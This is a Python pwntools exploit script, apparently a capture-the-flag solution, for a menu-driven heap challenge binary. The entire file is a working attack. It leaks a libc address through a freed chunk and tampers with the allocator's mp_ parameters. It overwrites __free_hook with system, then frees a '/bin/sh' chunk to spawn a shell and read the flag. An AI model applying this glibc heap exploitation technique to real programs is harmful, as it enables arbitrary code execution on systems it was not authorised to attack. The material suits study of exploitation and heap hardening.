from pwn import *
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
io = process("./pwn")
elf = ELF("./pwn")
libc=elf.libc 

menu="Input your choice"
def add(size,cont):
    io.sendlineafter(menu,str(1))
    io.sendlineafter("Size :",str(size))
    io.sendafter("Content :",cont)

def delete(idx):
    io.sendlineafter(menu,str(2))
    io.sendlineafter("Index :",str(idx))

def edit(addr):
    io.sendlineafter(menu,str(3))
    io.sendafter("content :",addr)

def show(idx):
    io.sendlineafter(menu,str(4))
    io.sendlineafter("Index :",str(idx))

add(0x500,b'a') 
add(0x500,b'/bin/sh\x00') 
add(0x500,b'a') 
add(0x500,b'a') 
add(0x100,b'a') 
delete(2)
add(0x500,b'a'*8) 
show(5)
io.recvuntil(b'a'*8)
libcbase=u64(io.recv(6).ljust(8,b"\x00"))-0x1ecbe0
print(hex(libcbase))
free_hook= libcbase +libc.sym['__free_hook']
system=libcbase+libc.sym['system']

mp_=libcbase+0x1EC280+0x50
edit(p64(mp_))

delete(3)
delete(0)
add(0x500,p64(0)*13+p64(free_hook)) 
add(0x500,p64(system))

delete(1)


io.interactive()
io.sendline('cat flag')
print(io.recvline())